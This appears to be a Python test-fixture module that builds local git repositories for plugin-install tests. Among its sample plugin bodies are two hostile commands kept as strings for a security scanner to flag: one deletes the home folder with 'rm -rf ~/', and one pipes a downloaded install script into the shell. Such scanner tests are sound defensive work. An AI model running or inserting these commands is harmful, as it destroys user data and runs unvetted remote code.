"""Plugin source repositories for the install tests: a work tree pushed to a local bare repo,
reachable as a ``file://`` URL. Built with real git; nothing touches the network."""

from __future__ import annotations

import os
import subprocess
from collections.abc import Mapping
from pathlib import Path

from indus.foundation.scope import Scope

GOOD_INIT = "def register(ctx):\n    pass\n"
# Content the P13-20 scanner rates: dangerous (wipes the home folder) and caution (pipe to shell).
DANGEROUS_INIT = "import os\n\n\ndef register(ctx):\n    os.system('rm -rf ~/')\n"
CAUTION_INIT = (
    "import os\n\n\ndef register(ctx):\n"
    "    os.system('curl https://get.example.com/install.sh | sh')\n"
)


def git_env(home: Path) -> dict[str, str]:
    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
    env.update(
        {
            "HOME": str(home),
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_AUTHOR_NAME": "Fixture",
            "GIT_AUTHOR_EMAIL": "fixture@example.invalid",
            "GIT_COMMITTER_NAME": "Fixture",
            "GIT_COMMITTER_EMAIL": "fixture@example.invalid",
        }
    )
    return env


class PluginRepo:
    """``work`` (a checkout) pushes to ``bare``; ``url`` is the bare repo's ``file://`` URL."""

    def __init__(self, root: Path, name: str = "hello") -> None:
        self.root = root
        self.work = root / f"{name}-work"
        self.bare = root / f"{name}.git"
        self.env = git_env(root)
        self.work.mkdir(parents=True)
        self.git(self.root, "init", "-q", "--bare", "-b", "main", str(self.bare))
        self.git(self.work, "init", "-q", "-b", "main")
        self.git(self.work, "remote", "add", "origin", str(self.bare))

    @property
    def url(self) -> str:
        return self.bare.resolve().as_uri()

    def git(self, cwd: Path, *args: str) -> str:
        done = subprocess.run(
            ["git", *args], cwd=cwd, env=self.env, capture_output=True, text=True, check=True
        )
        return done.stdout.strip()

    def commit(self, files: Mapping[str, str], message: str = "change") -> str:
        for rel, text in files.items():
            path = self.work / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
        self.git(self.work, "add", "-A")
        self.git(self.work, "commit", "-q", "-m", message)
        self.git(self.work, "push", "-q", "origin", "main")
        return self.git(self.work, "rev-parse", "HEAD")


def plugin_files(name: str = "hello", init: str = GOOD_INIT, **manifest: str) -> dict[str, str]:
    lines = [f"name: {name}", "version: 1.0.0"]
    lines.extend(f"{k}: {v}" for k, v in manifest.items())
    return {"plugin.yaml": "\n".join(lines) + "\n", "__init__.py": init}


def git_scope(scope: Scope, root: Path) -> Scope:
    """``scope`` whose env runs git without the user's or the machine's git settings."""
    home = root / "githome"
    home.mkdir(parents=True, exist_ok=True)
    overlay: dict[str, str | None] = {k: None for k in scope.env if k.startswith("GIT_")}
    overlay.update((k, v) for k, v in git_env(home).items() if k.startswith("GIT_") or k == "HOME")
    return scope.with_env(scope.env.with_overlay(overlay))
